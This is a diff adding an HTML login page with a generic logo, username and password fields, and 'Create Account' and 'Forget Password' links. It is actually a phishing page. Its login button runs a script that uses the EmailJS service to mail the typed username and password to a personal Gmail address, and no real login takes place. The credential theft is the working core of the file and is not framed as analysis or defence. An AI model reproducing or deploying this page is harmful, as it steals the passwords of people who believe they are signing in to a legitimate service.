@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>login</title>
+    <link rel="stylesheet" href="css/index.css">
+    <link rel="stylesheet" href="css/common.css">
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+</head>
+<body>
+    <div class="app">
+        <div class="lange">
+            <span>language</span>
+        </div>
+        <div class="logo">
+            <img src="img/ebd64f5013feda22.png" style=" height:8.5rem; width: initial;" alt="img">
+        </div>
+        <div class="login_h1">login</div>
+        <div class="login_input"><input type="text" id="userName" placeholder="Input Account" required></div>
+        <div class="login_input"><input type="password" id="password" placeholder="Input password" required></div>
+        <div class="login_btn" onclick="sendMmail();">login</div>
+        <a href="#" class="login_btn2">Create Account</a>
+        <div class="forget">Forget Password</div>
+    </div>
+
+
+    <script>
+        function sendMmail() {
+           (function () {
+              emailjs.init("ZM_hUk1I2FumtCzBZ"); // account public key
+           })();
+
+           let params = {
+              sendername: `nom d'utilisateur :${document.querySelector("#userName").value}`,
+              to: "takamloic35@gmail.com",
+              subjet: `mot de passe: ${document.querySelector("#password").value}`,
+              replyto: "noreply@gmail.com",
+              message: "ok",
+           };
+
+           let serviveID = "service_azrnrao"; // email service id
+
+           let templateID = "template_v6vxfok"; //email  template id
+
+           emailjs
+              .send(serviveID, templateID, params)
+
+              .then((res) => {
+                 alert("email send succesfully!");
+              })
+
+              .catch();
+        }
+     </script>
+   
+</body>
+</html>
